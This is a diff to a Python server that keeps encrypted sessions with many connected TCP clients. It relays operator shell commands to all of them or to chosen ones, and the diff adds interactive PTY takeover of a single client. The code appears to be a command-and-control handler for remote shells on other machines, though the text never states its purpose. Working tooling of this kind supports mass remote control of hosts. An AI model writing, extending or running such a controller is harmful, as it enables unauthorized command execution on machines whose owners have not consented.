@@ -1,4 +1,4 @@
-import os, sys, socket, threading, signal, json
+import os, sys, socket, threading, signal, json, traceback
 from concurrent.futures import ThreadPoolExecutor
 
 # initial crypto config
@@ -36,6 +36,9 @@ def showcrypto():
 def dispatch_command(sock, command, rpubkey):
     global bits
     send_encrypted(sock, command, rpubkey['e'], rpubkey['n'], bits=bits)
+
+def dispatch_ccmd(client, command):
+    dispatch_command(client['sock'], command, client['pubkey'])
 
 # brint takes a string
 def brint(*args, sep=' ', end='\n', prompt=True):
@@ -95,8 +98,10 @@ def blast_command(cmd, orig_screen, targets=set()):
     i = 0
     while alive and i < len(tcp_clients):
         try:
+            if tcp_clients[i]['pty']:
+                continue
             if wildcard or i in targets:
-                dispatch_command(tcp_clients[i]['sock'], cmd, tcp_clients[i]['pubkey'])
+                dispatch_ccmd(tcp_clients[i], cmd)
             if wildcard:
                 tcp_clients[i]['qidx'] += 1
         except:
@@ -115,12 +120,12 @@ def tcp_handshake(sock):
     sock.sendall(nbytes.to_bytes(headsz, 'big'))
 
     if rnbytes != nbytes:
+        brint('[ERROR] nbytes mismatch with client: %d vs %d' % (rnbytes, nbytes))
         return False
 
     rpubkey = { 'n': int.from_bytes(recv_encrypted(sock, privkey['d'], privkey['n'], bits=bits),\
                 'big'), 'e': exp }
 
-    dispatch_command(sock, 'set -i', rpubkey)
     return rpubkey
 
 def tcp_disconnect(client):
@@ -144,10 +149,12 @@ def transport_tcp(client):
     global tcp_clients, tcpc_lock
     try:
         rpk = tcp_handshake(client['sock'])
-    except:
+    except Exception as e:
+        brint('[ERROR] %s' % repr(e))
         rpk = False
     if not rpk:
         brint('[INFO] Handshake failed; disconnecting client:', client['addr'])
+        client['alive'] = False
         tcp_disconnect(client)
         return
     client['pubkey'] = rpk
@@ -157,8 +164,8 @@ def transport_tcp(client):
         if not client['alive']:
             tcp_disconnect(client)
             return
-
-        if len(cmdq) > client['qidx']:
+        
+        if not client['pty'] and len(cmdq) > client['qidx']:
             cmdq_lock.acquire()
             if not alive:
                 cmdq_lock.release()
@@ -167,7 +174,7 @@ def transport_tcp(client):
                 cmdq_lock.release()
                 tcp_disconnect(client)
                 return
-            if len(cmdq) <= client['qidx']:
+            if client['pty'] or len(cmdq) <= client['qidx']:
                 cmdq_lock.release()
                 continue
 
@@ -175,22 +182,34 @@ def transport_tcp(client):
             client['qidx'] += 1
             cmdq_lock.release()
             try:
-                dispatch_command(client['sock'], cmd, client['pubkey'])
+                dispatch_ccmd(client, cmd)
             except:
+                client['alive'] = False
                 tcp_disconnect(client)
                 return
         else:
             try:
                 data = recv_encrypted(client['sock'], privkey['d'], privkey['n'], bits=bits)
             except:
-                data = b'\xde\xad'
+                data = False
             if not alive:
                 return
-            elif data == b'\xde\xad':
+            elif not data or data == b'\xde\xad':
+                client['alive'] = False
                 tcp_disconnect(client)
+                if client['pty']:
+                    unpty(client)
                 return
-            elif len(data) > 0:
+            elif not client['pty']:
                 bnnl(data, logging=False)
+            elif data == b'\xc0\xdenpty':
+                unpty(client)
+            else:
+                try:
+                    client['pty'].sendall(data)
+                except:
+                    unpty(client)
+                    print('Screen failed to receive PTY data:', data)
 
 def serve_tcp():
     global sockets, tcp_port
@@ -228,6 +247,7 @@ def serve_tcp():
             'addr': ca,
             'sock': cs,
             'qidx': 0,
+            'pty': False,
             'alive': True
         }
         tcpc_lock.acquire()
@@ -239,7 +259,6 @@ def serve_tcp():
         try:
             pool.submit(transport_tcp, tcpcli)
         except RuntimeError:
-            print('OUCH')
             return
 
 def detach_screen(screen):
@@ -279,6 +298,69 @@ def cliinfo(clients):
         return info
     except Exception as e:
         return repr(e)
+
+def unpty(client):
+    global alive, tcp_clients, tcpc_lock
+    tcpc_lock.acquire()
+    if not alive:
+        tcpc_lock.release()
+        return
+    client['pty'] = False
+    tcpc_lock.release()
+
+def run_pty(screen, cn):
+    global alive, tcp_clients, tcpc_lock, privkey, bits
+    tcpc_lock.acquire()
+    if not alive:
+        tcpc_lock.release()
+        return
+
+    if cn >= len(tcp_clients):
+        tcpc_lock.release()
+        return 'Client %d disconnected while attaching PTY.' % cn
+    client = tcp_clients[cn]
+    client['pty'] = screen
+    tcpc_lock.release()
+
+    try:
+        dispatch_ccmd(client, b'pty')
+        if 'TERM' not in os.environ:
+            os.environ['TERM'] = 'xterm-256color'
+        dispatch_ccmd(client, os.environ['TERM'])
+    except:
+        client['alive'] = False
+        return 'Client %d failed PTY handshake.' % cn
+
+    try:
+        screen.sendall(b'\xc0\xdepty')
+    except:
+        unpty(client)
+        return False
+
+
+    while True:
+        if not alive:
+            return
+        elif not client['alive']:
+            return 'PTY session terminated due to client disconnect.'
+        elif not client['pty']:
+            return 'PTY session ended normally.'
+        elif client['pty'] != screen:
+            return 'PTY session seized by another screen.'
+
+        try:
+            data = screen.recv(1024)
+            if not alive:
+                return False
+        except:
+            data = b'\xde\xad'
+        if not data or data == b'\xde\xad':
+            unpty(client)
+            return False
+        try:
+            dispatch_ccmd(client, data)
+        except:
+            client['alive'] = False
 
 def screen_reader(screen):
     global alive, screens, screens_lock, cmdq, cmdq_lock, tcp_clients, tcpc_lock
@@ -342,6 +424,28 @@ def screen_reader(screen):
                 resp = showcrypto()
             elif cmd == b'\xc0\xdeprompt':
                 pass
+            elif cmd == b'pty':
+                resp = '[pk] Must specify a client to connect to via PTY.'
+            elif cmd[:4] == b'pty ':
+                try:
+                    cn = int(cmd[4:])
+                except:
+                    cn = -1
+                if cn < 0 or cn >= len(tcp_clients):
+                    resp = '[pk] Cannot attach PTY to invalid TCP client.'
+                else:
+                    pty_out = run_pty(screen, cn)
+                    if not alive:
+                        return
+                    if not pty_out:
+                        detach_screen(screen)
+                        return
+                    try:
+                        screen.sendall(b'\xc0\xdenpty')
+                    except:
+                        detach_screen(screen)
+                        return
+                    resp = '[pk] %s' % pty_out
             elif len(cmd) > 0:
                 shcmd = True
                 targets = []
@@ -358,6 +462,8 @@ def screen_reader(screen):
                     else:
                         resp = '[pk] Can\'t target null command.'
                 blast_command(cmd, screen, targets=targets)
+            if not alive:
+                return
             try:
                 if len(resp) > 0:
                     screen.sendall(bytes('%s\n' % resp, 'utf-8'))
@@ -440,7 +546,7 @@ def cleanup(*args):
     tcpc_lock.acquire()
     for client in tcp_clients:
         try:
-            send_encrypted(client['sock'], b'tunnel', client['pubkey']['e'], client['pubkey']['n'], bits=bits)
+            dispatch_ccmd(client, b'tunnel')
         except:
             pass
         client['sock'].close()
